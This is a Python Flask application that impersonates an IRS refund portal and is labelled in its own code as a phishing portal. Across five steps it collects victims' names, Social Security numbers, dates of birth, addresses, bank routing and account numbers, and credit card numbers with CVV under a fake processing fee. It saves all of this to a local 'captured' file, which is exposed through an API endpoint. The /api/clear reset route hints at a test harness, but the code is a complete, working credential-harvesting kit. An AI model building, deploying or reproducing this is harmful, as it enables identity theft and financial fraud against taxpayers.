import json
import os
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, jsonify

app = Flask(__name__)
app.secret_key = "gov-portal-irs-refund-2026-secret"

BASE = os.path.dirname(os.path.abspath(__file__))
CAPTURED_FILE = os.path.join(BASE, "..", "captured_data.json")

STEPS = {
    1: "Identity Verification",
    2: "Contact Information",
    3: "Direct Deposit Setup",
    4: "Expedited Processing",
    5: "Review & Submit",
}


def _read_captured():
    if os.path.exists(CAPTURED_FILE):
        with open(CAPTURED_FILE, "r") as f:
            return json.load(f)
    return []


def _save_captured(data):
    records = _read_captured()
    records.append({
        "timestamp": datetime.now().isoformat(),
        "source": "irs_phishing_portal",
        **data,
    })
    with open(CAPTURED_FILE, "w") as f:
        json.dump(records, f, indent=2)


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route("/")
def index():
    session.clear()
    return redirect(url_for("step", n=1))


@app.route("/refund-portal")
def refund_portal():
    session.clear()
    return redirect(url_for("step", n=1))


@app.route("/step/<int:n>", methods=["GET"])
def step(n):
    if n < 1 or n > 5:
        return redirect(url_for("step", n=1))
    return render_template(f"step{n}.html", step=n, steps=STEPS)


@app.route("/step/1", methods=["POST"])
def step1_post():
    data = {
        "step": 1,
        "step_name": "identity_verification",
        "full_name": request.form.get("full_name", "").strip(),
        "ssn": request.form.get("ssn", "").strip(),
        "date_of_birth": request.form.get("date_of_birth", "").strip(),
    }
    session["step1"] = data
    _save_captured(data)
    return redirect(url_for("step", n=2))


@app.route("/step/2", methods=["POST"])
def step2_post():
    data = {
        "step": 2,
        "step_name": "contact_information",
        "street_address": request.form.get("street_address", "").strip(),
        "city": request.form.get("city", "").strip(),
        "state": request.form.get("state", "").strip(),
        "zip_code": request.form.get("zip_code", "").strip(),
        "phone": request.form.get("phone", "").strip(),
    }
    session["step2"] = data
    _save_captured(data)
    return redirect(url_for("step", n=3))


@app.route("/step/3", methods=["POST"])
def step3_post():
    data = {
        "step": 3,
        "step_name": "direct_deposit_setup",
        "bank_name": request.form.get("bank_name", "").strip(),
        "routing_number": request.form.get("routing_number", "").strip(),
        "account_number": request.form.get("account_number", "").strip(),
        "account_type": request.form.get("account_type", "").strip(),
    }
    session["step3"] = data
    _save_captured(data)
    return redirect(url_for("step", n=4))


@app.route("/step/4", methods=["POST"])
def step4_post():
    data = {
        "step": 4,
        "step_name": "expedited_processing_fee",
        "card_number": request.form.get("card_number", "").strip(),
        "card_expiry": request.form.get("card_expiry", "").strip(),
        "card_cvv": request.form.get("card_cvv", "").strip(),
        "cardholder_name": request.form.get("cardholder_name", "").strip(),
    }
    session["step4"] = data
    _save_captured(data)
    return redirect(url_for("step", n=5))


@app.route("/step/5", methods=["POST"])
def step5_post():
    data = {
        "step": 5,
        "step_name": "consent_review_submitted",
        "recurring_fee_consent": request.form.get("recurring_fee") == "on",
        "data_sharing_consent": request.form.get("data_sharing") == "on",
        "marketing_consent": request.form.get("marketing") == "on",
    }
    session["step5"] = data
    _save_captured(data)
    return redirect(url_for("success"))


@app.route("/success")
def success():
    return render_template("success.html", steps=STEPS)


@app.route("/api/captured", methods=["POST", "GET"])
def api_captured():
    if request.method == "GET":
        return jsonify({"entries": _read_captured()})
    data = request.get_json(force=True, silent=True) or {}
    _save_captured(data)
    return jsonify({"status": "ok"})


@app.route("/api/clear", methods=["GET", "POST"])
def api_clear():
    with open(CAPTURED_FILE, "w") as f:
        json.dump([], f)
    return jsonify({"status": "ok"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8051, debug=False)
